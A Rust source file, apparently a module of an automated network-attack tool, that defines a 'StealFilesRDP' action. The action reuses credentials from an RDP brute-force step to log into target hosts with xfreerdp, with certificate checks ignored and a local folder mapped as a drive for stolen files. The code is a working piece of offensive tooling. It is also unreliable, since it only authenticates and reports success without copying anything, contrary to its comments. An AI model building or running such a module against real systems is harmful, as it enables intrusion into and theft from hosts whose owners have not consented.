use std::sync::Arc;
use std::time::Duration;

use tokio::time::timeout;

use crate::actions::{Action, ActionOutcome, Target};
use crate::state::AppState;

use super::{build_output_dir, get_credentials};

/// Steal files from RDP servers using xfreerdp drive mapping.
/// Parent: RDPBruteforce.
pub struct StealFilesRdp;

impl Action for StealFilesRdp {
    fn name(&self) -> &'static str {
        "StealFilesRDP"
    }
    fn port(&self) -> Option<u16> {
        Some(3389)
    }
    fn parent(&self) -> Option<&'static str> {
        Some("RDPBruteforce")
    }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(run(target, state))
    }
}

async fn run(target: &Target, state: &Arc<AppState>) -> ActionOutcome {
    let creds = get_credentials(state, target.host_id, "rdp").await;
    if creds.is_empty() {
        return ActionOutcome::Failed("no credentials".to_string());
    }

    let local_dir = build_output_dir(state, "rdp", &target.mac_address, &target.ip);
    let _ = tokio::fs::create_dir_all(&local_dir).await;

    // RDP file theft is limited — use xfreerdp with drive redirection
    // to map a local directory, then execute a remote copy command.
    for (user, password) in &creds {
        if state.shutdown.is_cancelled() {
            break;
        }

        let result = timeout(Duration::from_secs(120), async {
            // Map local_dir as a shared drive and run a remote dir command
            let output = tokio::process::Command::new("xfreerdp")
                .args([
                    &format!("/v:{}:{}", target.ip, 3389),
                    &format!("/u:{user}"),
                    &format!("/p:{password}"),
                    "/cert:ignore",
                    &format!("/drive:bjorn_share,{}", local_dir.display()),
                    "+auth-only",
                ])
                .output()
                .await;

            match output {
                Ok(o) if o.status.success() => Ok(()),
                Ok(o) => Err(String::from_utf8_lossy(&o.stderr).to_string()),
                Err(e) => Err(e.to_string()),
            }
        })
        .await;

        match result {
            Ok(Ok(())) => {
                tracing::info!(ip = %target.ip, "RDP connection with drive mapping succeeded");
                return ActionOutcome::Success;
            }
            Ok(Err(e)) => tracing::warn!(ip = %target.ip, %e, "RDP steal error"),
            Err(_) => tracing::warn!(ip = %target.ip, "RDP steal timed out"),
        }
    }

    ActionOutcome::Failed("RDP file theft failed".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn action_name() {
        let action = StealFilesRdp;
        assert_eq!(action.name(), "StealFilesRDP");
    }

    #[test]
    fn action_port() {
        let action = StealFilesRdp;
        assert_eq!(action.port(), Some(3389));
    }

    #[test]
    fn action_parent() {
        let action = StealFilesRdp;
        assert_eq!(action.parent(), Some("RDPBruteforce"));
    }
}
